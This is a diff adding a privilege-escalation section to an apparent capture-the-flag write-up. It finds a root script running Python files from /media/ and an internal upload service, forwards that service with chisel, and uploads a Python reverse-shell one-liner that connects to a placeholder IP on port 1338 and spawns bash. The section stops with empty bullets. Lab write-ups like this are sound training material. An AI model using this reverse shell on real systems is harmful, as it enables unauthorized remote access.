@@ -170,4 +170,82 @@ I was able to trigger binary the command to echo `God Abeg!!!.
   
 ### PRIVESC WITH INTERNAL ROOT SERVICE
 
--
+- A `root.sh` in user `king` home directory reveals that root runs every py file in  a particular directory `/media/`
+
+![image](https://github.com/user-attachments/assets/03d9aa3f-7ad8-4881-af0a-217dea19d210)
+
+- I ran `netstat -antp` and noticed a service on port `8080`.
+
+![image](https://github.com/user-attachments/assets/205f6e74-9d7c-4fd3-bead-3d52ea74cb79)
+
+- I checked it with netcat and noticed that it is a web page with py file upload functionality. This service upload the py files to the `/media/` directory.
+
+            king@ubuntu:~$ nc 127.0.0.1 8080
+            GET / HTTP/1.1
+            
+            HTTP/1.1 200 OK
+            Date: Wed, 21 Aug 2024 21:30:30 GMT
+            Server: WSGIServer/0.2 CPython/3.5.2
+            Content-Length: 2097
+            X-Frame-Options: SAMEORIGIN
+            Content-Type: text/html; charset=utf-8
+            
+            <!doctype html>
+            <html lang="en">
+            <head>
+              <meta charset="utf-8">
+              <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+              <link rel="stylesheet" type="text/css" href="mysite/static/css/bootstrap.min.css">
+              <link rel="stylesheet" type="text/css" href="mysite/static/css/app.css">
+              <title>DevelPy - Programming Services</title>
+            </head>
+            <body>
+              <nav class="navbar navbar-expand-lg navbar-light mb-4" style="background-color:#decdc3">
+                <div class="container">
+                  <a class="navbar-brand" href="/">DevelPy</a>
+                  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                  </button>
+                  <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                    <ul class="navbar-nav">
+                      <li class="nav-item">
+                        <a class="nav-link" href="/">Home</a>
+                      </li>
+                      <li class="nav-item">
+                        <a class="nav-link" href="/upload/">Simple Upload</a>
+                      </li>        </ul>
+                  </div>
+                </div>
+              </nav>
+              <div class="container">
+                <div class="row justify-content-center">
+                  <div class="col-lg-10 col-md-12">
+                    <div class="card mb-4">
+                      <div class="card-body">
+                        
+              <h2 class="card-title">Welcome to DevelPy - Python programming!</h2>
+              <p class="card-text">you search job? send your .py file! and show your talent!</p>
+            
+                      </div>
+                    </div>
+                  </div>
+                </div>
+            
+- I port forwarded the service to my machine with chisel.
+
+![image](https://github.com/user-attachments/assets/2f5537f5-a283-4285-bfa9-0ceb8f51eea6)
+
+- Now the webpage is running locally on our machine
+
+![image](https://github.com/user-attachments/assets/08de28e9-96d5-4d1e-ab51-a6bbe56f0294)
+
+- Our py script is rev shell python code from [revshells.com](https://revshell.com].
+  
+  Payload:```import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<ip>,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")```
+
+- 
+  
+
+
+            
+
